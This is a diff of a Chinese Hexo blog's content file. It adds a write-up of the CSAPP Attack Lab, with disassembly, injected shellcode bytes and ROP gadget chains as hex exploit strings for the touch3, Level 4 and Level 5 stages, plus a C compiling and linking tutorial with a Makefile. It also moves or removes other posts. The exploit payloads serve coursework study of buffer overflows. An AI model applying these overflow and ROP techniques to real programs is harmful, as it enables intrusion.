4018cf:	e8 cc f3 ff ff       	call   400ca0 &lt;strncmp@plt&gt;</span><br><span class="line">  4018d4:	85 c0                	test   %eax,%eax</span><br><span class="line">  4018d6:	0f 94 c0             	sete   %al</span><br><span class="line">  4018d9:	0f b6 c0             	movzbl %al,%eax</span><br><span class="line">  4018dc:	48 8b 74 24 78       	mov    0x78(%rsp),%rsi</span><br><span class="line">  4018e1:	64 48 33 34 25 28 00 	xor    %fs:0x28,%rsi</span><br><span class="line">  4018e8:	00 00 </span><br><span class="line">  4018ea:	74 05                	je     4018f1 &lt;hexmatch+0xa5&gt;</span><br><span class="line">  4018ec:	e8 ef f3 ff ff       	call   400ce0 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4018f1:	48 83 ec 80          	sub    $0xffffffffffffff80,%rsp</span><br><span class="line">  4018f5:	5b                   	pop    %rbx</span><br><span class="line">  4018f6:	5d                   	pop    %rbp</span><br><span class="line">  4018f7:	41 5c                	pop    %r12</span><br><span class="line">  4018f9:	c3                   	ret    </span><br><span class="line"></span><br><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  4018fa:	53                   	push   %rbx</span><br><span class="line">  4018fb:	48 89 fb             	mov    %rdi,%rbx        #将rdi里的参数复制到rbx</span><br><span class="line">  4018fe:	c7 05 d4 2b 20 00 03 	movl   $0x3,0x202bd4(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  401905:	00 00 00 </span><br><span class="line">  401908:	48 89 fe             	mov    %rdi,%rsi  #参数sval</span><br><span class="line">  40190b:	8b 3d d3 2b 20 00    	mov    0x202bd3(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401911:	e8 36 ff ff ff       	call   40184c &lt;hexmatch&gt;</span><br><span class="line">  401916:	85 c0                	test   %eax,%eax</span><br><span class="line">  401918:	74 23                	je     40193d &lt;touch3+0x43&gt;</span><br><span class="line">  40191a:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  40191d:	be 38 31 40 00       	mov    $0x403138,%esi</span><br><span class="line">  401922:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  401927:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40192c:	e8 bf f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401931:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401936:	e8 52 03 00 00       	call   401c8d &lt;validate&gt;</span><br><span class="line">  40193b:	eb 21                	jmp    40195e &lt;touch3+0x64&gt;</span><br><span class="line">  40193d:	48 89 da             	mov    %rbx,%rdx</span><br><span class="line">  401940:	be 60 31 40 00       	mov    $0x403160,%esi</span><br><span class="line">  401945:	bf 01 00 00 00       	mov    $0x1,%edi</span><br><span class="line">  40194a:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  40194f:	e8 9c f4 ff ff       	call   400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401954:	bf 03 00 00 00       	mov    $0x3,%edi</span><br><span class="line">  401959:	e8 f1 03 00 00       	call   401d4f &lt;fail&gt;</span><br><span class="line">  40195e:	bf 00 00 00 00       	mov    $0x0,%edi</span><br><span class="line">  401963:	e8 d8 f4 ff ff       	call   400e40 &lt;exit@plt&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先调用touch3之前，要确保rdi中有指针，注意参数类型是char*而上一个挑战 <code>void touch2(unsigned val)</code>参数是一个无符号整型，所以这一次我们还要创建一个字符串被rdi中的指针所指。字符串是“59b997fa”，我们将字符串的ascii输入。</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">db <span class="string">&quot;59b997fa&quot;</span><span class="punctuation">,</span><span class="number">0</span></span><br><span class="line">mov <span class="variable">%sval_address</span> <span class="punctuation">,</span><span class="variable">%rdi</span></span><br><span class="line">push <span class="variable">%touch3_address</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
+
+<p>字符串是以**’\0’**结尾的，其ascii是0，检测到0计算机就是到字符串结束了。我们只要将字符串的首地址放入寄存器rdi即可。题目描述中还提到<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825132143.png"></p>
+<p>可以看到在调用了hexmatch之后，连续push了三次<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825132422.png"></p>
+<p>所以临近返回地址的地方不要存放数据。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825133258.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:	48 c7 c7 78 dc 61 55 	mov    $0x5561dc78,%rdi</span><br><span class="line">7:	68 fa 18 40 00       	push   $0x4018fa</span><br><span class="line">c:	c3                   	ret    </span><br></pre></td></tr></table></figure>
+
+<p>所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 </span><br><span class="line">00 48 c7 c7 78 dc 61 55</span><br><span class="line">68 fa 18 40 00 c3 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">81 dc 61 55</span><br></pre></td></tr></table></figure>
+
+<p>注意，最后的四字节的地址不再是栈顶的位置，因为我们的字符串是存放在栈顶的，ret到栈顶程序不会向下执行，我们要ret到mov指令的地址。81&#x3D;78+9</p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825135929.png"></p>
+<p>失败了，猜测应该还是被hexmatch和strcmp压入的数据覆盖了，参考了一下，原来还可以将字符串放置在第44个字节后面，即test的栈帧中，因为我们不在返回test所以覆盖那里也没什么影响。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0:	48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi</span><br><span class="line">7:	68 fa 18 40 00       	push   $0x4018fa</span><br><span class="line">c:	c3                   	ret  </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 68</span><br><span class="line">fa 18 40 00 c3 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+
+<p>注意不能直接跟在44字节后面，因为64位机器ret指令相当于pop八个字节，pop之后rsp+8，所以字符串要在返回地址八个字节之后.0x5561dca8&#x3D;0x5561dc78+0x2c（48字节）。</p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825141847.png"></p>
+<p>成功！！！</p>
+<h3 id="实验部分2面向返回的编程："><a href="#实验部分2面向返回的编程：" class="headerlink" title="实验部分2面向返回的编程："></a>实验部分2面向返回的编程：</h3><p>这一部分难度增加，上一部分挑战栈既没有<strong>随机化</strong>也没有<strong>不可执行的内存标记</strong>。栈空间被标记为不可执行区域，所以我们不再能使用注入的shellcode。接下来的挑战要用到ROP ( Return-oriented Programming )即面向返回的编程。</p>
+<p><strong>ROP原理：</strong>		 </p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825205403.png"></p>
+<p>我们注入的内容被划分为一个个gadget，其实是一个个地址，gatcode有一个显著的特点，即最后一字节内容为c3即ret的机器码，这样一个个gatget就有ret指令连接了起来。既然栈内空间不可执行，那么这个地址要指向哪里呢？答案是程序现有的代码段，举例来说<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210000.png"></p>
+<p>这是一个函数，看起来没什么特别，也没有什么攻击性，但是转化为它的机器级表示<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210117.png"></p>
+<p>其中 <code>48 89 c7</code>是 <code>mov %rax,rdi</code>的机器码，我们只要在返回地址处填充0x400f18(起始地址400f15往后三个字节)即可执行<code>mov %rax,rdi</code>并且由ret弹出栈内的下一个地址继续操作。PDF给出了几张供我们参考攻击的表<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210817.png">                </p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210825.png"></p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210838.png"></p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825210846.png"></p>
+<p>好，接下来开搞。！！！</p>
+<h4 id="Level4："><a href="#Level4：" class="headerlink" title="Level4："></a>Level4：</h4><p>这个挑战和2要达到相同的目的，即test在调用完getbuf之后返回执行touch2，执行touch2之前要往%rdi中传递参数cookie。在level2中我们直接在栈中注入了<code>mov cookie，%rdi</code> 的机器码，这次挑战我们只能利用现有的代码执行。</p>
+<p>分为两步，cookie在我们注入的字符串中，要通过pop指令将cookie弹到rdi中，对应的机器码是 <code>5f</code>，可惜的是在给出的gadget中并没有5f，所以我们只能先将cookie弹到一个寄存器，再将这个寄存器的值复制到%rdi中</p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825212912.png"></p>
+<p><code>48 89 c7</code>对应 <code>mov %rax,%rdi</code>,地址是0x4019a2</p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825213149.png"></p>
+<p><code>58 90 c3</code> 对应 <code>popq %rax  ; nop ; ret</code> 。地址0x4019ab。接下来就该考虑注入的顺序了。</p>
+<p>touch2的地址：0x4017ec。cookie的值0x59b997fa</p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825214129.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230825221643.png"></p>
+<p>脑子抽了一直用上一个题目测试答案显示失败。。。</p>
+<h4 id="Level5："><a href="#Level5：" class="headerlink" title="Level5："></a>Level5：</h4><p>使用ROP完成level3。这是shellcode实现的操作：</p>
+<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">db <span class="string">&quot;59b997fa&quot;</span><span class="punctuation">,</span><span class="number">0</span></span><br><span class="line">mov <span class="variable">%sval_address</span> <span class="punctuation">,</span><span class="variable">%rdi</span></span><br><span class="line">push <span class="variable">%touch3_address</span></span><br><span class="line"><span class="keyword">ret</span></span><br></pre></td></tr></table></figure>
+
+<p>首先将字符串“35 39 62 39 39 37 66 61 0a 00”入栈，然后将其首地址pop到一个寄存器，然后复制到%edi，然后调用touch3，要考虑到hexmatch和strcmp对栈的影响。由于栈随机化的原因，我们不能直接获得字符串的地址，但是可以通过<code>movl %esp,xxx</code>指令得到当前的栈顶地址，计算出字符串的地址。<strong>movl以寄存器作为目的时会把高四个字节设置为0.</strong></p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826014517.png"></p>
+<p>只有一个选择 <code>48 89 e0</code> 即 <code>mov %rsp,%rax</code>  (或许89 e0),栈顶地址被放入%eax中,地址0x401a07。。。思考了良久之后，我发现无解了，因为仅靠寄存器之间的mov指令和pop指令不可能增加某个寄存器的值，所以我们放入%eax中的值不能发生变化，这显然不可能。</p>
+<p>看了提示之后才恍然大悟，题目并没有局限在mov，movl，popq指令之间，在提供的rop指令中存在大量的lea指令，之前学习过lea指令，加载有效地址，同时它可以进行四则混合运算，在这里我们需要他的<strong>加</strong>运算。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826024848.png"></p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826025317.png"></p>
+<p>检索了全部lea相关的指令，发现只有一个能够使用（其他都是lea    -0x6fa78caf(%rdi),%eax格式，即将%rdi加上一个立即数赋值给%eax）。<code>lea （%rdi,%rsi,1）,%rax</code>的作用是rax&#x3D;rdi+rsi*1，有了这条指令的帮助我们就可以变更栈中存放的地址。<img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826034218.png"></p>
+<p>只要按照这个思路，计算出X的值即可，实际操作过程中发现没有<code>pop %rsi</code>以及许多相关指令，最终只能用 <code>pop %rax ; mov eax,edx ; mov edx,ecx; mov ecx,esi </code>这四条指令来代替。</p>
+<p><code>pop %rax;ret</code>地址：0x4019ab</p>
+<p><code>mov eax,edx;ret</code>地址：0x401a42</p>
+<p><code>mov edx，ecx；ret</code>地址：0x401a69</p>
+<p><code>mov ecx,esi;ret</code>地址：0x401a13</p>
+<p><code>mov rsp,rax</code>地址：0x401aad</p>
+<p><code>mov rax,rdi</code>地址：0x4019a2</p>
+<p><code>lea    (%rdi,%rsi,1),%rax</code>地址：0x4019d6</p>
+<p><code>mov rax,rdi</code>地址：0x4019a2</p>
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826133126.png"></p>
+<p>通过计算，执行mov rsp，rdi的时候rsp的值是48，cookie相对它32个字节即0x20</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">20 00 00 00 00 00 00 00</span><br><span class="line">42 1a 40 00 00 00 00 00</span><br><span class="line">69 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">ad 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/26/Attack-lab/QQ%E6%88%AA%E5%9B%BE20230826133108.png"></p>
+<p>over，学到了很多^_^</p>
+]]></content>
+      <tags>
+        <tag>csapp</tag>
+        <tag>lab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>C语言-链接与编译</title>
+    <url>/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/</url>
+    <content><![CDATA[<p><strong>编译</strong> </p>
+<p>源文件生成目标文件的过程及main.c–main.o</p>
+<span id="more"></span>
+
+<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818011918.png"></p>
+<p><strong>链接</strong></p>
+<p>目标文件生成可执行文件的过程及main.o–main。详细点说链接是将编译之后的所有目标文件连同用到的一些静态库、运行时库组件而拼装成一个可执行文件的过程。其中有地址修复的过程，如上图所示call后面的地址暂时被设置为0，修复时就是链接器根据目标文件或者静态库中的重定位表找到那些需要被重定位的函数和全局变量从而修正他们的地址。</p>
+<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818011750.png"></p>
+<p>对于add.h 、add.c、main.c三个文件</p>
+<p>add.h</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br></pre></td></tr></table></figure>
+
+<p>add.c</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>main.c</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+b=%d\n&quot;</span>,addd(a,b));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译器是完全不知道printf和add函数的存在的（位于哪个区块、函数的定义），因此编译器只能将两个函数的跳转先暂时设置为0.使用odjdump对目标文件进行反汇编</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -s -d main.o &gt; main.o.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818013635.png"></p>
+<p>这里的0会在后面链接的时候被修正</p>
+<p>查看目标文件的重定位信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -r main.o</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818014305.png"></p>
+<p>函数add、printf的偏移量分别为25、3b。</p>
+<p>一直手工编译显然效率不高，学习了一点makefile的知识</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim makefile</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">all:main</span><br><span class="line">main:main.o add.o</span><br><span class="line">        gcc main.o add.o -o main</span><br><span class="line">main.o:main.c</span><br><span class="line">        gcc -c main.c</span><br><span class="line">add.o:add.c</span><br><span class="line">        gcc -c add.c</span><br><span class="line">clean:</span><br><span class="line">        rm main main.o add.o</span><br></pre></td></tr></table></figure>
+
+<p>然后make main即可，他会自动根据依赖树递归地去构建可执行文件main</p>
+<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818020241.png"></p>
+<p>参考：<a href="https://www.youtube.com/watch?v=1IIUvVrCSF0">https://www.youtube.com/watch?v=1IIUvVrCSF0</a></p>
+]]></content>
+      <tags>
+        <tag>C语言</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>GoogleCTF</title>
     <url>/2023/06/27/GoogleCTF/</url>
     <content><![CDATA[<h1 id="oldschool"><a href="#oldschool" class="headerlink" title="oldschool"></a>oldschool</h1><p>当时做的时候就很奇怪，为什么单步调试输入相应的用户名和密码就显示success，而直接运行程序提交相同的数据就是错误，更奇怪的是当时写的脚本能更正确解除第一组，而后面的矩阵用z3求逆都出现了问题，当时只是怀疑加了反调试修改了数据，但又不知从何处检查。。。。。。</p>
@@ -276,50 +502,6 @@
       </tags>
   </entry>
   <entry>
-    <title>C语言-链接与编译</title>
-    <url>/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/</url>
-    <content><![CDATA[<p><strong>编译</strong> </p>
-<p>源文件生成目标文件的过程及main.c–main.o</p>
-<span id="more"></span>
-
-<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818011918.png"></p>
-<p><strong>链接</strong></p>
-<p>目标文件生成可执行文件的过程及main.o–main。详细点说链接是将编译之后的所有目标文件连同用到的一些静态库、运行时库组件而拼装成一个可执行文件的过程。其中有地址修复的过程，如上图所示call后面的地址暂时被设置为0，修复时就是链接器根据目标文件或者静态库中的重定位表找到那些需要被重定位的函数和全局变量从而修正他们的地址。</p>
-<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818011750.png"></p>
-<p>对于add.h 、add.c、main.c三个文件</p>
-<p>add.h</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br></pre></td></tr></table></figure>
-
-<p>add.c</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>main.c</p>
-<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+b=%d\n&quot;</span>,addd(a,b));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>编译器是完全不知道printf和add函数的存在的（位于哪个区块、函数的定义），因此编译器只能将两个函数的跳转先暂时设置为0.使用odjdump对目标文件进行反汇编</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -s -d main.o &gt; main.o.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818013635.png"></p>
-<p>这里的0会在后面链接的时候被修正</p>
-<p>查看目标文件的重定位信息</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">objdump -r main.o</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818014305.png"></p>
-<p>函数add、printf的偏移量分别为25、3b。</p>
-<p>一直手工编译显然效率不高，学习了一点makefile的知识</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim makefile</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">all:main</span><br><span class="line">main:main.o add.o</span><br><span class="line">        gcc main.o add.o -o main</span><br><span class="line">main.o:main.c</span><br><span class="line">        gcc -c main.c</span><br><span class="line">add.o:add.c</span><br><span class="line">        gcc -c add.c</span><br><span class="line">clean:</span><br><span class="line">        rm main main.o add.o</span><br></pre></td></tr></table></figure>
-
-<p>然后make main即可，他会自动根据依赖树递归地去构建可执行文件main</p>
-<p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818020241.png"></p>
-<p>参考：<a href="https://www.youtube.com/watch?v=1IIUvVrCSF0">https://www.youtube.com/watch?v=1IIUvVrCSF0</a></p>
-]]></content>
-      <tags>
-        <tag>C语言</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>RC4</title>
     <url>/2023/08/20/RC4/</url>
     <content><![CDATA[<p>题目中也遇到过很多次RC4了，一般是都是从加密函数的名字看出，现在学习一下，了解其特征，更方便识别出。</p>
@@ -344,8 +526,8 @@
 <p>手写一遍之后以后遇到魔改的RC4应该就能拿捏了。</p>
 ]]></content>
       <tags>
-        <tag>对称加密</tag>
         <tag>密码学</tag>
+        <tag>对称加密</tag>
       </tags>
   </entry>
   <entry>
@@ -1001,71 +1183,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Hello World</title>
-    <url>/2022/12/18/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h2 id><a href="#" class="headerlink" title></a><span id="more"></span></h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a><!--more--></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>AES算法</title>
-    <url>/2023/08/18/AES%E7%AE%97%E6%B3%95/</url>
-    <content><![CDATA[<h2 id="算法简介"><a href="#算法简介" class="headerlink" title="算法简介"></a>算法简介</h2><p>AES（Advanced Encryption Standard，高级加密标准），不同于RC4这种流加密算法，AES属于<strong>块加密</strong>算法，其分组长度固定为128位，仅支持128位、192位、256位的密钥长度（密钥长度每增加64位，算法的循环次数增加两轮，10、12、14），分别称为AES-128、AES-192、AES-256。AES是一种<strong>对称加密</strong>算法。</p>
-<span id="more"></span>
-
-<p>下面以明文和密钥都是128位来举例。</p>
-<h2 id="存储形式"><a href="#存储形式" class="headerlink" title="存储形式"></a>存储形式</h2><p>16字节的明文以4*4矩阵的形式存储。按照从上至下从左至右的顺序存储。<img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803174932.png"></p>
-<h2 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h2><p>明文经过<strong>初始变化</strong>然后经过<strong>九轮的循环运算</strong>再经过一轮的<strong>最终轮</strong>运算即可得到密文。</p>
-<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803175347.png"></p>
-<p>最终轮相较于九轮循环运算少了列混合的过程，其余三个过程相同。</p>
-<h3 id="初始变换（Intial-round）"><a href="#初始变换（Intial-round）" class="headerlink" title="初始变换（Intial round）"></a>初始变换（Intial round）</h3><p>明文和<strong>子密钥</strong>存储在矩阵按字节进行异或，这一过程称为初始变换</p>
-<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803175921.png"></p>
-<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803180107.png"></p>
-<h3 id="九轮循环运算"><a href="#九轮循环运算" class="headerlink" title="九轮循环运算"></a>九轮循环运算</h3><p>分为四个步骤<strong>字节代换</strong>、<strong>行移位</strong>、<strong>列混合</strong>、<strong>轮密钥加</strong></p>
-<h4 id="字节代换"><a href="#字节代换" class="headerlink" title="字节代换"></a>字节代换</h4><p>简单来讲就是对初始变换后的明文进行查表替换，这个表就是S-box</p>
-<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803180404.png"></p>
-<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803180620.png"></p>
-<p>比如初始矩阵为</p>
-<p><img src="/2023/08/18/AES%E7%AE%97%E6%B3%95/QQ%E6%88%AA%E5%9B%BE20230803180742.png"></p>
-<p>第一个元素19，对应S表第一行第九列的元素d4，按照此规律进行全部的替换</p>
